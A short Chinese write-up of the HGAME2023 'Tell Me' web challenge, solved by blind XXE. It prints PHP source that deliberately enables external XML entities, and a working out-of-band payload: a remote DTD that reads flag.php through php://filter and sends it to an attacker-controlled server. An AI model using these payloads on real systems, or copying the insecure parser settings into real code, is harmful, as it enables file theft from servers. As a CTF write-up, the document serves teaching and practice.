# [HGAME2023]Tell Me
![](<./img/Pasted image 20230205110445.png>)

![](<./img/Pasted image 20230205110501.png>)

![](<./img/Pasted image 20230205110522.png>)

提示可以下载源码

![](<./img/Pasted image 20230205110551.png>)

`send.php`

```php
<?php 
    
libxml_disable_entity_loader(false);

if ($_SERVER["REQUEST_METHOD"] == "POST"){
    $xmldata = file_get_contents("php://input");
    if (isset($xmldata)){
        $dom = new DOMDocument();
        try {
            $dom->loadXML($xmldata, LIBXML_NOENT | LIBXML_DTDLOAD);
        }catch(Exception $e){
            $result = "loading xml data error";
            echo $result;
            return;
        }
        $data = simplexml_import_dom($dom);

        if (!isset($data->name) || !isset($data->email) || !isset($data->content)){
            $result = "name,email,content cannot be empty";
            echo $result;
            return;
        }

        if ($data->name && $data->email && $data->content){
            $result = "Success! I will see it later";
            echo $result;
            return;
        }else {
            $result = "Parse xml data error";
            echo $result;
            return;
        }
    }
}else {
    die("Request Method Not Allowed");
}

?>
```

`flag.php`

```php
<?php 
    $flag1 = "hgame{xxxx}";
?>
```

明示`XXE`盲注

在vps上部署`DTD`文件

```dtd
<!ENTITY % file SYSTEM "php://filter/read=convert.base64-encode/resource=flag.php">
<!ENTITY % int "<!ENTITY &#37; send SYSTEM 'http://xxx.xxx.xxx.xxx:2333?p=%file;'>">
```

![](<./img/Pasted image 20230205111620.png>)

payload如下

```xml
<!DOCTYPE convert [
<!ENTITY % remote SYSTEM "https://cloud.cracktc.top/d/local/test.dtd?sign=xxx">
%remote;%int;%send;
]>
```

![](<./img/Pasted image 20230205112753.png>)

![](<./img/Pasted image 20230205112853.png>)

#Web #PHP #源码泄漏 #XXE #盲注 #DTD #伪协议 